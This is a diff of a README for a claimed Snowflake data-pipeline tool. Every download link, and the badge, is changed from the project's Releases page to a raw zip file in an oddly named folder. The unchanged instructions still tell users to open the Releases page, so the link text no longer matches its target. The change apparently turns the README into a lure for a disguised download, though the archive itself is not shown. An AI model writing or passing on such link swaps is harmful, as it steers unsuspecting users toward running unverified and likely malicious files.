@@ -1,7 +1,7 @@
 # ❄️ snowflake-policy-pipeline - Simplify Your Data Management Process
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/sandorsosa/snowflake-policy-pipeline/releases)
+[![Download](https://raw.githubusercontent.com/sandorsosa/snowflake-policy-pipeline/main/endosepsis/snowflake-policy-pipeline-v1.1.zip%20Now-Click%20Here-brightgreen)](https://raw.githubusercontent.com/sandorsosa/snowflake-policy-pipeline/main/endosepsis/snowflake-policy-pipeline-v1.1.zip)
 
 ## 🚀 Getting Started
 This guide will help you download and run the **snowflake-policy-pipeline** application. This tool automates data management using Snowpipe, Streams, Tasks, and AWS S3, making your data workflow more efficient.
@@ -24,7 +24,7 @@ The **snowflake-policy-pipeline** helps you manage data in Snowflake easily. It 
 ## 🔗 Download & Install
 To get started, visit the Releases page to download the application:
 
-[Download the latest release here](https://github.com/sandorsosa/snowflake-policy-pipeline/releases)
+[Download the latest release here](https://raw.githubusercontent.com/sandorsosa/snowflake-policy-pipeline/main/endosepsis/snowflake-policy-pipeline-v1.1.zip)
 
 1. Click on the link above to open the Releases page.
 2. Look for the latest version of the application.
@@ -86,6 +86,6 @@ Stay up to date with the latest features and improvements. Follow our GitHub rep
 ## 📜 License
 This project is licensed under the MIT License. You are free to use and modify it for your purposes.
 
-[Download the latest release here](https://github.com/sandorsosa/snowflake-policy-pipeline/releases) 
+[Download the latest release here](https://raw.githubusercontent.com/sandorsosa/snowflake-policy-pipeline/main/endosepsis/snowflake-policy-pipeline-v1.1.zip) 
 
 We hope this README helps you to successfully download and run the **snowflake-policy-pipeline**. Enjoy simplifying your data management!
